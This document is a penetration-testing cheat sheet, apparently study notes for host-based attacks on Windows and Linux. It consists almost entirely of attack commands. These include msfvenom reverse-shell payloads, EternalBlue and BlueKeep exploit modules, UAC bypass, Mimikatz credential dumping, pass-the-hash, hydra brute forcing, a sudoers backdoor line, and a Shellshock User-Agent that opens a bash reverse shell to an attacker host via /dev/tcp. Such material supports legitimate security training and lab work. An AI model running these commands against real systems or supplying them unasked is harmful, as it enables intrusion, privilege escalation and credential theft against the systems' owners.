
---

### Introduction to System/Host-Based Attacks

System-based attacks target a specific host or system, often after initial access has been gained through reconnaissance and network infiltration. These attacks typically exploit vulnerabilities inherent to the operating system (OS) or commonly used services running on the host.

---

### Windows Vulnerabilities

#### Overview

- Popular OS, widely used across enterprises.
    
- Common vulnerabilities: MS08-067, MS17-010.
    
- Fragmented attack surface due to numerous Windows versions.
    
- Types: Information Disclosure, Buffer Overflows, RCE, Privilege Escalation, DoS.
    

#### Frequently Exploited Services

- SMB, RDP, WebDAV, WinRM, IIS.
    

---

### Exploiting Windows Vulnerabilities

#### Microsoft IIS WebDAV

```
nmap -sV --script=http-enum <TargetIP>
davtest -url http://<TargetIP>/webdav
davtest -auth user:pass -url http://<TargetIP>/webdav
cadaver http://<TargetIP>/webdav
```

With Metasploit:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<MyIP> LPORT=<Port> -f asp > shell.asp
cadaver http://<TargetIP>/webdav
msf5 > use multi/handler
msf5 > use exploit/windows/iis/iis_webdav_upload_asp
```

#### SMB & PsExec

```
msf5 > use auxiliary/scanner/smb/smb_login
psexec.py user@<TargetIP> cmd.exe
msf5 > use exploit/windows/smb/psexec
```

#### MS17-010 (EternalBlue)

```
sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 <TargetIP>
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
msf5 > use exploit/windows/smb/ms17_010_psexec
```

#### RDP & BlueKeep

```
msf5 > use scanner/rdp/rdp_scanner
hydra -L users.txt -P passwords.txt rdp://<TargetIP>
xfreerdp /u:<user> /p:<pass> /v:<TargetIP>:<Port>
msf5 > use scanner/rdp/cve_2019_0708_bluekeep
msf5 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

#### WinRM

```
crackmapexec winrm <TargetIP> -u user -p pass -x "cmd"
evil-winrm -u user -p 'pass' -i <TargetIP>
```

---

### Windows Privilege Escalation

#### Kernel Exploits

Tools:

- [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
    
- [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)
    

```
meterpreter > getprivs
meterpreter > getsystem
msf6 > use post/multi/recon/local_exploit_suggester
systeminfo > systeminfo.txt
python3 windows-exploit-suggester.py --database <db.xls> --systeminfo systeminfo.txt
```

#### Bypassing UAC (UACMe)

Tool: [UACMe](https://github.com/hfiref0x/UACME)

```
Upload payload and Akagi64.exe to C:\tmp
C:\tmp> Akagi64.exe 23 C:\tmp\backdoor.exe
```

#### Access Token Impersonation (Incognito)

```
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "token_name"
```

---

### Windows File System Vulnerabilities

#### Alternate Data Streams (ADS)

```
notepad test.txt:secret.txt
type payload.exe > VisibleFile.txt:payload.exe
mklink legit.exe VisibleFile.txt:payload.exe
```

---

### Windows Credentials Dumping

#### SAM Hash Dumping

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f exe > payload.exe
certutil -urlcache -f http://<IP>:<Port>/payload.exe payload.exe
```

#### Using Mimikatz/Kiwi

```
meterpreter > pgrep lsass
meterpreter > load kiwi
mimikatz > lsadump::sam
mimikatz > sekurlsa::logonpasswords
```

#### Pass-the-Hash

```
crackmapexec smb <TargetIP> -u user -p "NTLMhash"
```

---

### Linux Vulnerabilities

#### Common Services

- Apache
    
- SSH
    
- FTP
    
- SAMBA
    

---

### Exploiting Linux Vulnerabilities

#### Shellshock (CVE-2014-6271)

```
nmap -sV <TargetIP> --script=http-shellshock --script-args "http-shellshock.uri=/cgi-bin/script.cgi"
User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1'
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
```

#### FTP

```
ftp <TargetIP>
nmap -sV --script=ftp-anon <TargetIP>
hydra -L users.txt -P passwords.txt <TargetIP> ftp
```

#### SSH

```
hydra -L users.txt -P passwords.txt <TargetIP> ssh
```

#### SAMBA

```
hydra -L users.txt -P passwords.txt <TargetIP> smb
smbmap -H <TargetIP> -u user -p pass
smbclient -L <TargetIP> -U user
enum4linux -a -u user -p pass <TargetIP>
```

---

### Linux Privilege Escalation

#### Kernel Exploits

Tool: [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)

```
meterpreter > sysinfo
meterpreter > upload linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

#### Cron Jobs

```
crontab -l
grep -rnw /usr -e "/path/to/cron/script"
echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers
```

#### SUID Binaries

```
cp /bin/bash greetings
./suid_binary
```

---

### Linux Credential Dumping

#### /etc/shadow Dump

```
msf6 > use exploit/unix/ftp/proftpd_133c_backdoor
msf6 > sessions -u <id>
meterpreter > cat /etc/shadow
msf6 > use post/linux/gather/hashdump
```

---

